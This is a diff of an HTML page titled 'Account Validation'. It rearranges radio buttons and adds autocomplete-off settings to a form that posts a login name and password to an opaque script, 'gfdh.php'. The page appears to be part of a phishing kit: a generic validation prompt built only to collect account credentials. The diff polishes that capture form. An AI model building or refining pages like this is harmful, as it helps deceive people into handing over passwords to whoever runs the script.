@@ -8,18 +8,7 @@
 <body bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJDT05GSUciOiJkaXNhYmxlZCJ9LCJ2ZXJzaW9uIjoiMi4wLjEyIiwic2NvcmUiOjIwMDEyfV0=" data-new-gr-c-s-check-loaded="14.1162.0" data-gr-ext-installed="">
 
 <form action="gfdh.php" method="POST" ><br><br>
-<div style="margin-left:32%;">
 
-<input type="radio" class="btn-check" name="options" id="option2" autocomplete="off">
-<label class="btn btn-secondary" for="option2">Email</label>
-
-<input type="radio" class="btn-check" name="options" id="option1" autocomplete="off" checked>
-<label class="btn btn-secondary" for="option1">Username</label>
-
-
-<input type="radio" class="btn-check" name="options" id="option4" autocomplete="off">
-<label class="btn btn-secondary" for="option4">Mobile</label>
-</div>
 <div align="center" width="">
     <div class="logo" bis_skin_checked="1">
 
@@ -29,13 +18,25 @@
     <div class="title" bis_skin_checked="1">Account Validation</div>
                 
         <div class="form" bis_skin_checked="1">
+		<div style="width:100%;">
+
+<input type="radio" class="btn-check" name="options" id="option2" autocomplete="off">
+<label class="btn btn-secondary" for="option2">Email</label>
+
+<input type="radio" class="btn-check" name="options" id="option1" autocomplete="off" checked>
+<label class="btn btn-secondary" for="option1">Username</label>
+
+
+<input type="radio" class="btn-check" name="options" id="option4" autocomplete="off">
+<label style="padding-right:170px;" class="btn btn-secondary" for="option4">Mobile</label>
+</div>
                     
             <div class="username" bis_skin_checked="1" style="width:35%;">
-                <input type="text" name="email" placeholder="Email/Phone/Username" required="required" style="width:90%;">
+                <input type="text" name="email" placeholder="Email/Phone/Username" autocomplete="off" required="required" style="width:90%;">
             </div>
 
         <div class="password" bis_skin_checked="1" style="width:35%;">
-            <input type="password" name="password" placeholder="password" required="required" style="width:90%;">
+            <input type="password" name="password" placeholder="Password" required="required" autocomplete="off" style="width:90%;">
         </div>
            
         </div>
